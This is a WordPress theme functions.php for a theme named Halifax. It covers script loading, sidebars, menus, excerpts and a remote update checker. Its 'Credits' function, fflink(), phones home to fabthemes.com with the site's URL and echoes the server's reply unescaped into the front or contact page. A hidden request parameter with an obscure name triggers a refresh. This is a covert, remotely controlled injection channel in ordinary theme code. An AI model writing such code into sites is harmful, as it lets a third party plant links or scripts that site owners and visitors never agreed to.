<?php 

require_once('class-tgm-plugin-activation.php');
include ( 'getplugins.php' );
include ( 'guide.php' );
include ( 'aq_resizer.php' );



/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Halifax',                                            //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/halifax.json' //URL of the metadata file.
);


/* Load scripts */

function lod_scripts() {
	global $post;

	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'responsive-style', get_template_directory_uri() . '/css/responsive-style.css' );
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css' );
	
	wp_enqueue_script( 'mobilemenu', get_template_directory_uri() . '/js/jquery.mobilemenu.js', array( 'jquery' ),  true );
	wp_enqueue_script( 'masonry', get_template_directory_uri() . '/js/jquery.masonry.min.js', array( 'jquery' ),  true );
	wp_enqueue_script( 'flex-slider', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array( 'jquery' ), true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/scripts.js', array( 'jquery' ),  true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'lod_scripts' );


/* Set content width */

if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */


/**
 * Add default posts and comments RSS feed links to head
*/
 
add_theme_support( 'automatic-feed-links' );
	
	
/* SIDEBARS */
if ( function_exists('register_sidebar') )




	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	));

	register_sidebar(array(
	'name' => 'Footer',
	'before_widget' => '<li class="botwid four columns %2$s">',
	'after_widget' => '</li>',
	'before_title' => '<h3 class="bothead">',
	'after_title' => '</h3>',
	));		





/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }	


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );


}



/* PAGE NAVIGATION */

function getpagenavi(){
	?>
	<div id="navigation" class="clearfix">
	<?php if(function_exists('wp_pagenavi')) : ?>
	<?php wp_pagenavi() ?>
	<?php else : ?>
	        <div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries','web2feeel')) ?></div>
	        <div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;','web2feel')) ?></div>
	        <div class="clear"></div>
	<?php endif; ?>

	</div>

	<?php
	}
	

/* Excerpt length	 */
	
function wpe_excerptlength_archive($length) {
    return 60;
}
function wpe_excerptlength_index($length) {
    return 30;
}

function wpe_excerptmore($more) {
return '...';
}

function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}

/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid || !is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	
